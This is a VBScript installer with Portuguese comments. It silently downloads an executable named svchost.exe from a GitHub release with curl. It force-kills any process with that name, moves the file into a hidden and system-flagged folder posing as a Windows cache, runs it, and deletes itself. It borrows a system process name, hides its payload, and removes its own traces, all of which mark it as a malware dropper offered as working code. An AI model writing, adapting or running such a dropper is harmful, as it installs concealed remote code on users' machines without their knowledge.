' installer.vbs — baixa svchost.exe do GitHub, move pra pasta oculta e executa.
' Não abre janela nenhuma (roda 100% em background).

Option Explicit

Dim shell, fso, userProfile, downloads, destino, exeUrl, vbsDir, tmpExe
Dim cmdBaixar, destinoExe, tentativas

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' ==== Configurações ====
exeUrl = "https://github.com/luizinhoboladim-lang/lan/releases/latest/download/svchost.exe"

userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%")
downloads = userProfile & "\Downloads"
tmpExe = downloads & "\svchost.exe"

vbsDir = fso.GetParentFolderName(WScript.ScriptFullName)

' Pasta oculta de destino (mesma do main.py)
destino = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\Caches\Local"
destinoExe = destino & "\svchost.exe"

' ==== 1. Baixa o svchost.exe ====
cmdBaixar = "cmd /c curl -sSL -o """ & tmpExe & """ """ & exeUrl & """"
shell.Run cmdBaixar, 0, True

' Espera o arquivo aparecer (até 30s)
tentativas = 0
Do While Not fso.FileExists(tmpExe) And tentativas < 60
    WScript.Sleep 500
    tentativas = tentativas + 1
Loop

If Not fso.FileExists(tmpExe) Then
    MsgBox "Falha ao baixar o arquivo. Verifique sua internet.", 16, "Erro"
    WScript.Quit 1
End If

' ==== 2. Mata o processo antigo (se estiver rodando) ====
' Sem isso, o Windows mantém o arquivo travado e o MoveFile falha com
' "O arquivo já existe" (erro 800A003A).
shell.Run "cmd /c taskkill /f /im svchost.exe >nul 2>&1", 0, True
WScript.Sleep 1500

' ==== 3. Cria pasta oculta e move ====
If Not fso.FolderExists(destino) Then
    fso.CreateFolder(destino)
End If

' Marca a pasta como oculta + sistema
shell.Run "attrib +h +s """ & destino & """", 0, True

' Se já existe versão lá, apaga antes
If fso.FileExists(destinoExe) Then
    On Error Resume Next
    fso.DeleteFile destinoExe, True
    On Error Goto 0
    WScript.Sleep 500
End If

' Move com tratamento de erro
On Error Resume Next
fso.MoveFile tmpExe, destinoExe
If Err.Number <> 0 Then
    MsgBox "Não consegui mover o arquivo." & vbCrLf & vbCrLf & _
           "Feche o svchost.exe no Gerenciador de Tarefas e tente de novo." & vbCrLf & vbCrLf & _
           "Detalhes: " & Err.Description, 16, "Erro"
    WScript.Quit 1
End If
On Error Goto 0

' Marca o exe como oculto + sistema
shell.Run "attrib +h +s """ & destinoExe & """", 0, True

' ==== 4. Executa ====
shell.Run """" & destinoExe & """", 1, False

' ==== 5. Auto-deleta este .vbs ====
Dim vbsPath
vbsPath = WScript.ScriptFullName
shell.Run "cmd /c timeout /t 2 /nobreak >nul & del /f /q """ & vbsPath & """", 0, False
